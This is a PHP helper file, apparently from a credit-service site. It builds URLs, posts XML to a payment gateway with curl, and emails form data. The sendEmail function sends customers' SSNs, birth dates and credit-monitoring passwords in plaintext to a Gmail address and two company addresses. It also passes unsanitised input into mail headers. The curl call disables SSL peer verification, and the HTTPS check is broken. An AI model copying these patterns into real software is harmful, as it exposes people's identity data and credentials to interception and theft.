<?php

 function getBaseUrl(){
            // output: /myproject/index.php
            $currentPath = $_SERVER['PHP_SELF']; 
            
            // output: Array ( [dirname] => /myproject [basename] => index.php [extension] => php [filename] => index ) 
            $pathInfo = pathinfo($currentPath); 
            
            // output: localhost
            $hostName = $_SERVER['HTTP_HOST']; 
            
            // output: http://
            $protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,5))=='https://'?'https://':'http://';
            
            // return: http://localhost/myproject/
            return $protocol.$hostName.$pathInfo['dirname']."/";
    }
      // Helper function to make building xml dom easier
  function appendXmlNode($domDocument, $parentNode, $name, $value) {
        $childNode      = $domDocument->createElement($name);
        $childNodeValue = $domDocument->createTextNode($value);
        $childNode->appendChild($childNodeValue);
        $parentNode->appendChild($childNode);
  }

  function sendEmail($first_name,$last_name,$email,$ssn,$dob,$cu,$cp){
    $subject = 'subcription payment'; // Subject of your email
    $from = 'cdmionline.com';

  // Receiver email address
  $to = ['990credit@gmail.com','lbecker@cdmionline.com','egbrown@cdmionline.com'];  //Change the email address by yours

  
  $userData = 'first name:'.$first_name.' last_name:'.$last_name.' email:'.$email.' SSN:'.$ssn.' DOB:'.$dob . 'Credit monitoring UN '.$cu. 'Credit monitoring pass: '.$cp;

  // prepare header
  $header = 'From: '. $from. "\r\n";
  $header .= 'Reply-To:  '. $first_name . " " .$last_name. ' <'. $email .'>'. "\r\n";
  // $header .= 'Cc:  ' . 'example@domain.com' . "\r\n";
  // $header .= 'Bcc:  ' . 'example@domain.com' . "\r\n";
  $header .= 'X-Mailer: PHP/' . phpversion();

  $message = '';
  $message .= 'Name: ' . $first_name . " " .$last_name . "\n";
  $message .= 'Email: ' . $email . "\n";
  $message .= 'Subject: ' . $subject . "\n";
  $message .= 'Message: '. $userData;

  // Send user information
  for($x = 0; $x < count($to) ; $x++){
     $mail = mail( $to[$x], $subject , $message, $header );   
  }
 

  // echo 'sent';
  }


  function sendXMLviaCurl($xmlRequest,$gatewayURL) {
   // helper function demonstrating how to send the xml with curl


    $ch = curl_init(); // Initialize curl handle
    curl_setopt($ch, CURLOPT_URL, $gatewayURL); // Set POST URL

    $headers = array();
    $headers[] = "Content-type: text/xml";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); // Add http headers to let it know we're sending XML
    $xmlString = $xmlRequest->saveXML();
    curl_setopt($ch, CURLOPT_FAILONERROR, 1); // Fail on errors
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); // Allow redirects
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Return into a variable
    curl_setopt($ch, CURLOPT_PORT, 443); // Set the port number
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Times out after 30s
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $xmlString); // Add XML directly in POST

    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);


    // This should be unset in production use. With it on, it forces the ssl cert to be valid
    // before sending info.
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

    if (!($data = curl_exec($ch))) {
        print  "curl error =>" .curl_error($ch) ."\n";
        throw New Exception(" CURL ERROR :" . curl_error($ch));

    }
    curl_close($ch);

    return $data;
  }

?>